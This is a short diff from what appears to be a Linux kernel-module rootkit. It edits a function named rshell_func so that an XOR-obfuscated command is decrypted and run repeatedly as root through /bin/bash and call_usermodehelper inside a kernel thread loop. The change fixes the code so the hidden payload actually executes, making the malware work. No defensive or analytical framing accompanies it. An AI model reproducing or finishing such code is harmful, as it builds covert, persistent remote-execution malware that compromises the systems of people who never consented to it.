@@ -22,7 +22,7 @@ int rshell_func(void* data) {
     xor_decrypt(xor_cmd);
     pr_info("hey %s", xor_cmd);
 
-    char* argv[] = { "/bin/bash", "-c", command, NULL };
+    char* argv[] = { "/bin/bash", "-c", xor_cmd, NULL };
     static char* envp[] = { "HOME=/", "TERM=linux", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
         while (!kthread_should_stop()) {
             call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
